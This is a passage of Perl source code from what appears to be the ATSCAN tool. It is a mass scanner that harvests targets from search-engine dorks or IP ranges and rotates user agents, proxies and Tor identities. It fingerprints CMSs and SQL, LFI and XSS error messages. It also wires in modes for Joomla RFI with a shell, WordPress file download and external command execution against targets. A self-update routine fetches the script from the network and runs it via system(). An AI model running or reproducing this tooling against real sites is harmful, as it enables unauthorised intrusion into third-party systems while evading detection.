advise() if ((!defined $dork)&&(!defined $help)&&(!defined $Target)&&(!defined $mmd5)&&(!defined $mencode64)&&(!defined $checkVersion)&&(!defined $data)&&(!defined $uninstall));
#########################################################
## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
if (defined $Target || defined $exploit) {
  if ((!defined $xss)&&(!defined $data)&&(!defined $lfi)&&(!defined $ifinurl)&&(!defined $WpSites)&&(!defined $Hstatus)&&(!defined $validText)&&(!defined $adminPage)&&(!defined $subdomain)&&
      (!defined $JoomRfi)&&(!defined $WpAfd)&&(!defined $msites)&&(!defined $port)&&(!defined $mupload)&&(!defined $mzip)&&(!defined $command)&&(!defined $JoomSites)&&(!defined $eMails)&&
      (!defined $mlevel)&&(!defined $searchIps)&&(!defined $regex)) { print $c[4]."[!] $OTHERS[7]\n"; logoff(); }
}
#########################################################
## CHECK TARGET PROTOCOL
if ((defined $Target)&&(!defined $mlevel)) { 
  if (defined $msites and $Target=~/$V_IP/) { print $c[4]."[!] $DT[20]\n"; logoff(); }
  if ((!-e $Target)&&($Target!~/$V_IP/)) {
    if ($Target!~/https?:\/\//) { print $c[4]."[!] $DT[16]\n"; logoff(); }
  }
}
#########################################################
## CHECK RANDOM PARAMS
if (defined $mrandom && !defined $mlevel) { print $c[4]."[!] $DT[38]\n"; logoff(); }
#########################################################
## ARGUMENTS VERIFICATION (LEVEL / PORTS)
if ((defined $dork)&&(!defined $mlevel)) { print $c[4]."[!] $DT[40]\n"; logoff(); }
if ((defined $port) && (!defined $tcp and !defined $udp)) { print $c[4]."$DT[23]\n"; logoff(); }
#########################################################
## MORE ARGUMENTS PROCESS VERIFICATION
if ((defined $dork) || (defined $Target)) { 
  if ((defined $JoomRfi) and (!defined $shell)) { print $c[4]."[!] $DT[41]\n"; logoff(); }
  if ((defined $replace)&&(!defined $with)) { print $c[4]."[!] $DT[22]\n"; logoff(); }
}
if ((!defined $dork) && (defined $unique)) { print $c[4]."[!] $DT[21]\n"; logoff(); }
if (defined $regex or defined $eMails or defined $searchRegex or defined $searchIps) { if (defined $Hstatus) { print $c[4]."[!] $SCAN_TITLE[2]"; logoff(); } }
#########################################################
## CHECK MOTORS ARGUMENTS
if (defined $motor) {
  if (defined $mrandom) { print $c[4]."$TT[14]\n"; logoff(); }
  if ($motor!~/1|2|3|4|5|all/) { 
    print $c[2]."[!] "; timer();
    print "$DT[25]\n".$c[4]."   $DT[27] \n   $OTHERS[5] -m 1,2,...\n"; logoff();
  }
}
#########################################################
## CHECK VALIDATION ARGUMENTS
if (defined $validText && defined $Hstatus) { print $c[4]."[!] $OTHERS[18]\n"; logoff(); }
#########################################################
## CHECK LEVEL
if (defined $mlevel) {
  if ($mlevel!~/^[0-9,.E]+$/) { print $c[4]."$TT[15]\n"; logoff(); }
}
#########################################################
## ADVISE DATA WITHOUT METHOD
if (defined $data and (!defined $post && !defined $get)) { print $c[4]."$TT[16]\n"; logoff(); }
#########################################################
## ADVISE
sub advise {
  if (-e "/usr/bin/atscan") { print $c[4]."[!] $OTHERS[5]: $TT[7]\n"; }
  else{ print "[!] $OTHERS[5]: perl ./",basename($0)," $TT[8] ./",basename($0)," $TT[9]\n"; }
  logoff();
}
#########################################################
## CHECK PAUSE ARGUMENT
if (defined $data) {
  if ($limit<500) {
    if (!defined $Hstatus && !defined $validText) { print $c[4]."$TT[17]\n"; logoff(); }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SET BROWSER TIME
$timeout=10 if !defined $timeout;
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BROWSER 
use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request;
binmode STDOUT, ":utf8";
for my $sys(@sys) {
  for my $vary(@vary) {
    my $ag="$sys) $vary";
    push @systems, $ag;
  }
}
my ($system, $agent, $ua);
$agent="Mozilla/5.0 (".$systems[rand @systems];
$ua=LWP::UserAgent->new( agent => $agent, cookie_jar => HTTP::Cookies->new());
$ua->default_header('Accept' => ('text/html'));
$ua->env_proxy;
$ua->timeout($timeout);
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## RENEW AGENT
sub getNewAgent {
  $agent="Mozilla/5.0 (".$systems[rand @systems];
  $ua=LWP::UserAgent->new( agent => $agent, cookie_jar => HTTP::Cookies->new());
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PROXY
sub getProx {
  my $getProx=$_[0];
  if ($getProx=~/:/) { @proxies=split / /, $getProx; }
  else{ @proxies=buildArraysLists($getProx); }
  return @proxies;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BUILD PROXIES ARRAY
if (defined $proxy) { @proxies=getProx($proxy); }
if (defined $prandom) { @proxies=getProx($prandom); }
my $psx=$proxies[rand @proxies];
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SET BROWSER 
sub UA { $ua->proxy([qw/ http https ftp ftps /] => $psx); $ua->cookie_jar({ }); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## RENEW PROXY
sub newIdentity {
  if ((defined $proxy && $proxy=~/(localhost|127.0.0.1)/) || (defined $prandom && $prandom=~/(localhost|127.0.0.1)/)) {
    system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP -1;"); }
  else{ $psx=$proxies[rand @proxies]; UA(); }
  my ($response, $html, $status, $serverheader)=getHtml($ipUrl, "");
  if ($response->is_success) { 
    if (!defined $noinfo) { 
	  if ($response->content=~m/$V_IP/g) { my $ipadress="$1"; print $c[1]."    $ErrT[21] $c[8]  $ErrT[22] ::: $ipadress :::\n"; }
	}
  }
  else{ ltak(); print $c[4]."[!] $DT[30] [$psx]!\n"; logoff(); }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BUILT ARRAYS
sub buildArraysLists {
  my $buildArrays=$_[0];
  my @buildArrays=();
  if (-e $buildArrays) {
    open (UAL, $buildArrays);
    while (my $buildArray=<UAL>) {
      chomp $buildArray;
      push @buildArrays, $buildArray;
    }
  }else{
    $buildArrays=~s/\s+$//g;
    $buildArrays=~s/^\[OTHER]//g;
    @buildArrays=split /\[OTHER\]/, $buildArrays;
  }
  return @buildArrays;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## USER ARRAYS
if (defined $payloads) { @userArraysList=buildArraysLists($payloads); }
## EXPLOITS ARRAYS
if (defined $exploit) { @exploits=buildArraysLists($exploit); }
## DATA ARRAYS
if (defined $data) { @data=buildArraysLists($data); }
## DORKS & TARGETS ARRAYS
if (defined $mlevel) {
  if (defined $dork) { @dorks=buildArraysLists($dork); }
  elsif (defined $Target) {
    if (($Target=~/$V_RANG/)&&($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp=$1.".".$2.".".$3.".".$4;
      my $endIp=$5.".".$6.".".$7.".".$8;  
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      @ip=split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) { 
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) { 
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) { 
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) { 
              $ip[3]=0 if($l == $8);
              $newIp=join('.',$i,$j,$k,$l);
              $newIp="ip%3A".$newIp;             
              push @dorks, $newIp;
            }
	      }
	    }
      }
    }else{
      @dorks=buildArraysLists($Target);
    }
  }
}else{
  if (defined $Target) {
    if (($Target=~/$V_RANG/)&&($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp=$1.".".$2.".".$3.".".$4;
      my $endIp=$5.".".$6.".".$7.".".$8;
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      @ip=split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) { 
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) { 
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) { 
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) { 
              $ip[3]=0 if($l == $8);
              $newIp=join('.',$i,$j,$k,$l);
              push @aTsearch, $newIp;
            }
          }
	    }
      }
    }else{ @aTsearch=buildArraysLists($Target); }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT FILES 
sub printFile {
  my ($File, $context)=@_;
  open (FILE, '>>', $File); print FILE "$context\n"; close(FILE);
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PAYLOADS NOTICE
my $paylNote="[!] $DT[28]\n";
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SCAN INFO
sub osinfo { 
  use Config;
  print $c[5]." [::] $TT[0]:: ".$c[8]."$TT[5]\n".$c[5]." [::] $TT[1]:: ".$c[8]."$TT[6] [$logoVersion]\n".$c[5]." [::] $TT[2]:: ".$c[8]."$Bin/",basename($0)," \n";
  print $c[5]." [::] $TT[3]:: ".$c[8]."[$^V]\n".$c[5]." [::] $TT[4]:: ".$c[8]."[$Config{ osname} $Config{ archname}]\n";
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## REMOVE URLS PROTOCOL
sub removeProtocol { 
  my $URL=$_[0];
  my %replace=('http://' => '', 'https://'=>'', 'ftp://'=>'', 'ftps://'=>'', 'socks(4|5)?://'=>'');
  $URL=~s/$_/$replace{ $_}/g for keys %replace;
  return $URL;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## REMOVE QUERY STRING
sub removeQuery { 
  my $URL=$_[0];
  $URL=removeProtocol($URL);
  $URL=~s/=.*/=/g;
  $URL=checkUrlSchema($URL);	
  return $URL;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK TARGETS FOR REPLACE OPTION
sub control { 
  my $URL=$_[0];
  if (defined $noQuery) { $URL=removeQuery($URL); }
  if (defined $mdom) {               
	$URL=removeProtocol($URL);
    $URL=~s/\/.*//s;
  }
  if (defined $replace) {
	if (index($URL, $replace) != -1) {
      $URL=~s/$replace(.*)/$replace/g if defined $full; 
      $URL=~s/$replace/$with/ig;
    }
  }    
  $URL=checkUrlSchema($URL);
  return $URL;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## EXTRAT INFO PROCESS SCAN
sub checkExtraInfo { 
  my $URL3=$_[0];
  my $ip;
  if (!defined $port) {
    $URL3=cleanURL($URL3);
    use Socket;
    $ip=inet_aton($URL3);
  }
  return $ip;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CLEAN URL
sub cleanURL {
  my $URL=$_[0];
  my %replace=( 'http://' => '', 'https://' => '', 'www.' => '', 'ftp://' => '', 'ftps://' => '');
  $URL=~s/$_/$replace{ $_}/g for keys %replace;
  $URL=~s/\/.*//s;
  return $URL;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BUILT POSITIVE SCAN RESULTS LIST
sub saveme { 
  my ($URL1, $sep)=@_;
  my $o=OO();
  if ($o<$limit) {
    push @aTscans, $URL1;
    if (defined $output) { printFile("$outdir/$output", " $URL1"); }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SCAN TITLE
sub title { 
  if (defined $output) { my $SCAN_TITLE=$_[0];  printFile("$outdir/$output", "="x30 ."\n$SCAN_TITLE\n"."="x30); }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SCAN HTML CMS
sub checkCms { 
  my $html=$_[0];  
  for my $CMS(@CMS) { if ( $html=~/$CMS/ ) { my $CMS1=$CMS; checkCmsType($CMS1); last; } }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## DEFINE HTML CMS
sub checkCmsType { 
  my $CMS1=$_[0];
  if (grep( /^$CMS1$/, @V_WP)) { print $c[1]."    $cms[0]     $c[4]$cms[1]\n"; } 
  if (grep( /^$CMS1$/, @V_JOOM)) { print $c[1]."    $cms[0]     $c[4]$cms[2]\n"; }
  if (grep( /^$CMS1$/, @V_TP)) { print $c[1]."    $cms[0]     $c[4]$cms[3]\n"; }
  if (grep( /^$CMS1$/, @V_SMF)) { print $c[1]."    $cms[0]     $c[4]$cms[4]\n"; }
  if (grep( /^$CMS1$/, @V_PhpBB)) { print $c[1]."    $cms[0]     $c[4]$cms[5]\n"; }
  if (grep( /^$CMS1$/, @V_VB)) { print $c[1]."    $cms[0]     $c[4]$cms[6]\n"; }
  if (grep( /^$CMS1$/, @V_MyBB)) { print $c[1]."    $cms[0]     $c[4]$cms[7]\n"; }
  if (grep( /^$CMS1$/, @V_CF)) { print $c[1]."    $cms[0]     $c[4]$cms[8]\n"; }
  if (grep( /^$CMS1$/, @V_PN)) { print $c[1]."    $cms[0]     $c[4]$cms[9]\n"; }
  if (grep( /^$CMS1$/, @V_DRP)) { print $c[1]."    $cms[0]     $c[4]$cms[10]\n"; } 
  if (grep( /^$CMS1$/, @V_AT)) { print $c[1]."    $cms[0]     $c[4]$cms[11]\n"; }
  if (grep( /^$CMS1$/, @V_PHPN)) { print $c[1]."    $cms[0]     $c[4]$cms[12]\n"; }
  if (grep( /^$CMS1$/, @V_MD)) { print $c[1]."    $cms[0]     $c[4]$cms[13]\n"; }
  if (grep( /^$CMS1$/, @V_ACM)) { print $c[1]."    $cms[0]     $c[4]$cms[14]\n"; }
  if (grep( /^$CMS1$/, @V_SS)) { print $c[1]."    $cms[0]     $c[4]$cms[15]\n"; }
  if (grep( /^$CMS1$/, @V_MX)) { print $c[1]."    $cms[0]     $c[4]$cms[16]\n"; }
  if (grep( /^$CMS1$/, @V_XO)) { print $c[1]."    $cms[0]     $c[4]$cms[17]\n"; }
  if (grep( /^$CMS1$/, @V_OSC)) { print $c[1]."    $cms[0]     $c[4]$cms[18]\n"; }
  if (grep( /^$CMS1$/, @V_PSH)) { print $c[1]."    $cms[0]     $c[4]$cms[19]\n"; }
  if (grep( /^$CMS1$/, @V_BB2)) { print $c[1]."    $cms[0]     $c[4]$cms[20]\n"; }
  if (grep( /^$CMS1$/, @V_MG)) { print $c[1]."    $cms[0]     $c[4]$cms[21]\n"; }
  if (grep( /^$CMS1$/, @V_ZC)) { print $c[1]."    $cms[0]     $c[4]$cms[22]\n"; }
  if (grep( /^$CMS1$/, @V_CC5)) { print $c[1]."    $cms[0]     $c[4]$cms[23]\n"; }
  if (grep( /^$CMS1$/, @V_OCR)) { print $c[1]."    $cms[0]     $c[4]$cms[24]\n"; }  
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK IF THERE ANY ERROR IN HTML
sub checkErrors { 
  my $html=$_[0];
  my $ERROR=join("|", @ERR);
  if ($html=~/$ERROR/) {
    my (@E1, @E2, @E3, @E4, @E5, @E6, @E7, @E8, @E9, @E10, @E11, @E12, @E13, @E14, @E15, @E16, @E17, @E18, @E19);
    print $c[1]."    $ErrT[18] $c[4]$ErrT[24]\n";
    for my $ERR(@ERR) {
      if ($html=~/$ERR/g) {
        if (grep( /^$ERR$/, @V_LFI)) { push(@E1, $ERR); }
        if (grep( /^$ERR$/, @V_XSS)) { push(@E2, $ERR); }
        if (grep( /^$ERR$/, @V_AFD)) { push(@E3, $ERR); }
        if (grep( /^$ERR$/, @E_MICROSOFT)) { push(@E4, $ERR); }
        if (grep( /^$ERR$/, @E_ORACLE)) { push(@E5, $ERR); }
        if (grep( /^$ERR$/, @E_DB2)) { push(@E6, $ERR); }
        if (grep( /^$ERR$/, @E_ODBC)) { push(@E7, $ERR); }
        if (grep( /^$ERR$/, @E_POSTGRESQL)) { push(@E8, $ERR); }
        if (grep( /^$ERR$/, @E_SYBASE)) { push(@E9, $ERR); }
        if (grep( /^$ERR$/, @E_JBOSSWEB)) { push(@E10, $ERR); }
        if (grep( /^$ERR$/, @E_JDBC)) { push(@E11, $ERR); }
        if (grep( /^$ERR$/, @E_JAVA)) { push(@E12, $ERR); }
        if (grep( /^$ERR$/, @E_PHP)) { push(@E13, $ERR); }
        if (grep( /^$ERR$/, @E_ASP)) { push(@E14, $ERR); }
        if (grep( /^$ERR$/, @E_LUA)) { push(@E15, $ERR); }
        if (grep( /^$ERR$/, @E_UNDEFINED)) { push(@E16, $ERR); }
        if (grep( /^$ERR$/, @E_MARIADB)) { push(@E17, $ERR); }
        if (grep( /^$ERR$/, @E_SHELL)) { push(@E18, $ERR); }
      }
    }
    if (@E1) { for my $E(@E1) { printALLerrors($ErrT[0], $E); } }    
    if (@E2) { for my $E(@E2) { printALLerrors($ErrT[1], $E); } }
    if (@E3) { for my $E(@E3) { printALLerrors($ErrT[2], $E); } }
    if (@E4) { for my $E(@E4) { printALLerrors($ErrT[3], $E); } }
    if (@E5) { for my $E(@E5) { printALLerrors($ErrT[4], $E); } }
    if (@E6) { for my $E(@E6) { printALLerrors($ErrT[5], $E); } }
    if (@E7) { for my $E(@E7) { printALLerrors($ErrT[6], $E); } }
    if (@E8) { for my $E(@E8) { printALLerrors($ErrT[7], $E); } }
    if (@E9) { for my $E(@E9) { printALLerrors($ErrT[8], $E); } }
    if (@E10) { for my $E(@E10) { printALLerrors($ErrT[9], $E); } }
    if (@E11) { for my $E(@E11) { printALLerrors($ErrT[10], $E); } }
    if (@E12) { for my $E(@E12) { printALLerrors($ErrT[11], $E); } }
    if (@E13) { for my $E(@E13) { printALLerrors($ErrT[12], $E); } }
    if (@E14) { for my $E(@E14) { printALLerrors($ErrT[13], $E); } }
    if (@E15) { for my $E(@E15) { printALLerrors($ErrT[14], $E); } }
    if (@E16) { for my $E(@E16) { printALLerrors($ErrT[15], $E); } }
    if (@E17) { for my $E(@E17) { printALLerrors($ErrT[16], $E); } }
    if (@E18) { for my $E(@E18) { printALLerrors($ErrT[17], $E); } }   
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT HTML ERRORS
sub printALLerrors { my ($ErrT, $E)=@_; print $c[1]."$sp $c[4]$ErrT ".$c[10]."[$E]"; print "\n"; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK URL PARTS
sub checkUrlSchema { 
  my $URL=$_[0];
  if ($URL!~/(https?|ftp):\/\//) { $URL="http://$URL"; }; return $URL;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## RETURN NEGATIVE SCAN
sub negative { ltak(); print $c[4]."[!] $DT[1]\n"; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## DESCLAIMER
sub desclaimer {
  mtak(); ptak(); print $c[10]."  $OTHERS[11] \n  $OTHERS[12]  \n  $OTHERS[13] \n";
  mtak(); ptak();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BGN SCAN TITLE
sub scanTitleBgn { print $c[11]."[!] "; timer(); print " ::: $DS[67] "; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## END SCAN TITLE
sub scanTitleEnd { print $c[11]." $DS[4] :::\n"; ptak(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET DOMMAINE AND REMOVE PROTOCOL
sub removeDupNoProtocol {
  for my $URL(@aTsearch) { $URL=removeProtocol($URL); $URL=~s/www.//s; saveCopy($URL); }
  my @aTsearch=checkDuplicate(@aTsearch); IfDup();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MEKE SEARCH COPY
sub makeCopy { my @aTcopy=(); push @aTcopy, @aTsearch; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## RESTAURE SEARCH COPY
sub restaureSearch { my @aTsearch=(); push @aTsearch, @aTcopy; @aTcopy=(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## REMOVE DUPLICATE DOMAINES WPAFD/JOOMRFI/SUBDOMAINS/ADMIN
sub removeDupDom { 
  makeCopy();
  for my $URL(@aTsearch) { $URL=removeProtocol($URL); $URL=~s/\/.*//s; $URL=checkUrlSchema($URL); saveCopy($URL); }
  my @aTsearch=checkDuplicate(@aTsearch); IfDup();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SAVE NON DUPLICATE DOMAINES
sub saveCopy { my $URL=$_[0]; push @aTtargets, $URL; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## REMOVE DUPLICATE RESULTS
sub checkDuplicate { 
  my @AS=@_;
  my @AS2;
  for my $as(@AS) { $as=~s/(\%27|\<|\>|\%25|\')(.*)//ig; push @AS2, $as; }
  my %seen;
  @AS2=grep{ not $seen{$_}++ } @_;
  return @AS2;
}   
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET CLEAN TARGETS DOMAINE
sub IfDup { my @aTsearch=(); @aTsearch=@aTtargets; @aTtargets=(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## END SCAN PROCESS
sub subfin {
  ltak();
  print $c[2]."[!] "; timer(); print " $DT[3]!\n";
  if (defined $ifend) { print chr(7); }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## COUNT SCAN RESULTS
sub countResultLists {
  ltak();
  my $o=OO();
  if ($o==$limit) { print $c[4]."[!] $DT[34] ($limit)!\n"; }
  print $c[3]."[!] ".$o." $DT[4]\n";
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SEARCH REGEX FILTER
sub doRegex { 
  my $searchRegex=$_[0];
  for my $URL(@aTsearch) {
    if ($URL=~/$searchRegex/) { saveCopy($URL); }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK VERSION 
sub checkVersion {
  desclaimer(); testConnection();
  my ($response, $html, $status, $serverheader)=getHtml($scriptUrl, "");
  if ($response->is_success) {
    printFile($script_bac, $response->content);
    use File::Compare;      
    if (compare($script_bac, $script) == 0) {
      print $c[3]." $DT[6]\n"; }
    else{
      unlink $script;
      if (-e $script) { print $c[4]." [!] $ErrT[19] $script\n"; logoff(); }
      printFile($script, $response->content);
      system("chmod +x $script | perl $script || atscan");
      mtak(); ptak();
      print $c[3]."[!] $DT[7]$c[10]\n";
      my ($res, $html, $status, $serverheader)=getHtml($logUrl, "");
      print $res->content."";  
    }
    unlink $script_bac if -e $script_bac;
  }else{ print $c[2]."[!] $DT[8]!\n"; }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SCAN DETAILS
sub scanDetail { if (!defined $mlevel) { desclaimer(); print $c[4]."[!] $DT[31]\n" if !defined $proxy && !defined $prandom; testConnection(); } }
######################################################################################################################################################################################################
## END FUCTIONS ######################################################################################################################################################################################
## MAKE SCANS   ######################################################################################################################################################################################
######################################################################################################################################################################################################
## TEST INTERNET CONNECTION
sub testConnection { 
  if (defined $proxy || defined $prandom) { print $c[4]."[!] $DT[31]\n".$c[4]."[!] $ErrT[20] [$psx].. "; UA(); }
  my ($response, $html, $status, $serverheader)=getHtml($ipUrl, "");
  if (!$response->is_success) {
    print $c[4]."\n[!] $ErrT[23]\n".$c[2]."[!] $DT[11]\n[!] $DT[10]\n"; logoff();
  }else{
    if (defined $proxy || defined $prandom) { print $c[3]."[!] OK!\n"; ltak(); sleep(1); }    
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SET ENGINES
if (defined $mlevel) {
  if (defined $mrandom ) { push @motor, $mrand; }
  elsif (defined $motor) { 
    if ($motor!~m/$motorparam/) { push @motor, $motor; }
    else{
      if ($motor=~/all/) { push @motor, @mrands; }
      if ($motor=~/1/) { push @motor, $motor1; }
      if ($motor=~/2/) { push @motor, $motor2; }
      if ($motor=~/3/) { push @motor, $motor3; }
      if ($motor=~/4/) { push @motor, $motor4; }
      if ($motor=~/5/) { push @motor, $motor5; }
    }    
  }else{
    push @motor, $motor1;
  }
  for my $mot(@motor) {
    $mot=~s/MYBROWSERLANG/$browserLang/g;
    $mot=~s/MYGOOGLEDOMAINE/$googleDomain/g;
    $mot=~s/MYID/$Id/g;
    $mot=~s/MYMSID/$MsId/g;
    push @motors, $mot;
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET URLS FROM SEARCH ENGINE PAGES
sub doSearch {
  my ($Res, $motor)=@_;
  while($Res=~/$V_SEARCH/g) {
    my $URL=$1;
    if ($motor =~/$googleDomain/) { $URL=~s/\&.*//s; }
    $URL=~s/%([0-9A-Fa-f]{ 2})/chr(hex($1))/eg;
	$URL=uri_unescape($URL);
	$URL=decode_entities($URL);
    $URL=~s/<.*//s;
    if ($URL!~/$nolisting/) {
      if (defined $unique or defined $ifinurl) {
        my $dorkToCheeck=checkFilters($dork);
        $URL=filterUr($URL, $dorkToCheeck);
      }
	  if ((defined $msites) || (defined $Target) || (defined $mdom)) {               
		$URL=removeProtocol($URL);
        $URL=~s/\/.*//s;
        $URL=checkUrlSchema($URL);
      }
      my $vURL=validateURL($URL);
      if ($vURL) {
        push @aTsearch, $URL;
      }
    }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET FILTERS
sub checkFilters {
  my $dorkToCheeck=$_[0];
  my $dmn="";
  if ($dorkToCheeck=~/(site:(.*)\+|\+site:(.*))/) {
    $dmn=$1;
    $dmn=~s/\+//g;
    $dmn=~s/site:/\./g;
  }
  $dorkToCheeck=~s/:\s/:/g;
  $dorkToCheeck=~s/$pat2//g;
  return ($dorkToCheeck);
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET FILTRED URLS
sub filterUr {
  my ($URL, $dorkToCheeck)=@_;
  if (defined $unique) {
    if (index($URL, $dorkToCheeck) != -1) { $URL=$URL; }else{ $URL=""; }
  }
  if (defined $ifinurl) {
    if (index($URL, $ifinurl) != -1) { $URL=$URL; }else{ $URL=""; }
  }
  return $URL;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## VALIDATE URL PARTS
sub validateURL {
  my $vURL=$_[0];
  $vURL=cleanURL($vURL);
  return $vURL if $vURL=~/([a-zA-Z0-9\-\_]\.)?([a-zA-Z0-9\-\_]\.)[a-zA-Z]/;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## INFO URL SCAN
sub printInfoUrl {
  my ($URL1, $data)=@_;
  my $o=OO();
  if ($o<$limit) {
    if (!defined $noinfo) {  
      printProxy();
      print $c[1]."    $SCAN_TITLE[23]   ";
      if (defined $brandom) { print $c[10]."[$TT[12]\] "; }
      print "$c[10]$agent\n";
      print $c[1]."    $OTHERS[19]  $c[10]";
      if (defined $get) { print "$DS[15]\n"; }
      elsif (defined $post) { print "$DT[32]\n"; }
      else{ print "$DS[15]\n"; }
      if ($timeout>10) { print $c[1]."    $TT[10] ".$c[10]."$timeout s\n"; }  
      if (defined $noQuery) { print $c[5]."    $DS[16] $c[10] $DS[40]\n"; }
      if ((defined $replace)&&(defined $with)) { print $c[1]."    $OTHERS[14]   "; print $c[10]."[$replace] => [$with]\n"; }
    }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BROWES URL
sub browseUrl {
  my ($URL1, $form)=@_;
  printInfoUrl($URL1, $data);
  if (defined $proxy) { UA(); }
  elsif (defined $prandom) { newIdentity(); UA(); }
  my ($response, $html, $status, $serverheader)=getHtml($URL1, $form);
  my $o=OO();
  if ($o<$limit) {
    if (!defined $noinfo) { 
      if ($response->previous) { print $c[1]."    $DS[1]    $c[4]$DT[36]", $response->request->uri, "\n"; }    
      print $c[1]."    $DS[3]    ". $c[10]."$DS[13] $status\n"; print $c[1]."    $DS[2]  ";
      if (defined $serverheader) { print $c[10]."$serverheader\n"; } 
      else { print $c[10]."$DT[35]\n"; }
      my $ips=checkExtraInfo($URL1);
      print $c[1]."    $DS[10]      ";
      if ($ips) { my $ad=inet_ntoa($ips); print $c[10]."$ad\n"; }
      else{ print $c[10]."$DT[35]\n"; }
      checkCms($html); checkErrors($html);
    }
  }
  return ($response, $status, $html);
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET HTML
sub getHtml {
  my ($URL, $form)=@_;
  my $response;
  if (defined $brandom) { getNewAgent(); }
  if ($form) {
    if (defined $post) {
      $response=$ua->post($URL, Content_Type => 'form-data', Content => [$form]); }
    elsif (defined $get) { 
      $URL.="?".$form;
      my $request=HTTP::Request->new($DS[15], $URL); $response=$ua->request($request);
    }
  }else{
    if (defined $post) { $response=$ua->post($URL); }
    elsif (defined $get) { my $request=HTTP::Request->new($DS[15], $URL); $response=$ua->request($request);
    }else{ my $request=HTTP::Request->new($DS[15], $URL); $response=$ua->request($request); }
  }
  my $html=$response->content;
  $html=~ s/\&#(\d+);/chr($1)/eg;
  my $status=$response->code;
  my $serverheader=$response->server;
  return ($response, $html, $status, $serverheader);
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## REGEX SCANS / EMAIL / IP / REGEX
sub getRegex {
  my ($URL1, $html, $reg)=@_;
  my $o=OO();
  if ($o<$limit) {
    if (!defined $searchIps and !defined $eMails) { print $c[1]."    $SCAN_TITLE[25]  $c[10] [$reg]\n"; }
    titleSCAN();
    my $hssab=0;
    while ($html=~/$reg/g) {
      my $o=OO();
      if ($o<$limit) {
        my $validRegex=checkValidation($1, "", $html, "", "");
        if ($validRegex) {     
          $hssab++;
          print " | " if $hssab>1;
          print $c[3]."$validRegex";
          saveme($validRegex, "1");
        }
      }
    }
    if ($hssab<1) { noResult(); }else{ print "\n"; }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## EXECUTE EXTERN PROCESS COMMANDS
sub getComnd {
  my ($URL1, $comnd)=@_;
  $URL1=~s/(\%27|\<|\>|\%25|\')(.*)//ig;
  if ($URL1=~/(($V_IP)\:(\d{2,6}))/) {
    $URL1=removeProtocol($URL1);
    if ($comnd=~/-PORT/) {
      $URL1=~s/\:/\./g;
      my @f=split /\./, $URL1;
      my $Addr="$f[0].$f[1].$f[2].$f[3]";
      my $Port=$f[4];
      $comnd=~s/\-\-TARGET/$Addr/ig;
      $comnd=~s/\-\-PORT/$Port/ig;
